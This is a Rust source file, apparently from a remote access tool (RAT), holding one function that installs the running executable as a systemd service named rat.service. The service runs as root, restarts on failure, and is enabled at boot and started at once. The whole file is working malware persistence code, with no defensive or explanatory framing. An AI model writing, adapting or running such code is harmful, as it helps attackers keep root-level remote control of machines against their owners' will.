use std::io::{Error, ErrorKind, Result, Write};
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use std::process::Command;
use std::{env, fs};

pub fn create_zombie_service() -> Result<()> {
    let current_exe_path = env::current_exe()?.display().to_string();
    let service_content = format!(
        r#"
[Unit]
Description=RAT Service (DELETE THIS IF YOU DID NOT INSTALL IT)
After=network.target

[Service]
ExecStart={}
User=root
Restart=always

[Install]
WantedBy=multi-user.target
"#,
        current_exe_path
    );

    // Path to the systemd service file
    let service_file_path = "/etc/systemd/system/rat.service";

    // Check if the service file already exists
    if Path::new(service_file_path).exists() {
        println!("Service file already exists.");
        return Ok(());
    }

    // Write the service file
    let mut file = fs::File::create(service_file_path)?;
    file.write_all(service_content.as_bytes())?;

    // Set the permissions to 644 (readable by all, writable by root)
    fs::set_permissions(service_file_path, fs::Permissions::from_mode(0o644))?;

    println!("Service file created at {}", service_file_path);

    // Reload systemd to recognize the new service
    let output = Command::new("systemctl").arg("daemon-reload").output()?;
    if !output.status.success() {
        eprintln!(
            "Failed to reload systemd: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        return Err(Error::new(ErrorKind::Other, "Failed to reload systemd"));
    }

    // Enable the service to start on boot
    let output = Command::new("systemctl")
        .arg("enable")
        .arg("rat.service")
        .output()?;
    if !output.status.success() {
        eprintln!(
            "Failed to enable the service: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        return Err(Error::new(ErrorKind::Other, "Failed to enable service"));
    }

    // Start the service immediately
    let output = Command::new("systemctl")
        .arg("start")
        .arg("rat.service")
        .output()?;
    if !output.status.success() {
        eprintln!(
            "Failed to start the service: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        return Err(Error::new(ErrorKind::Other, "Failed to start service"));
    }

    println!("Service started successfully.");
    Ok(())
}
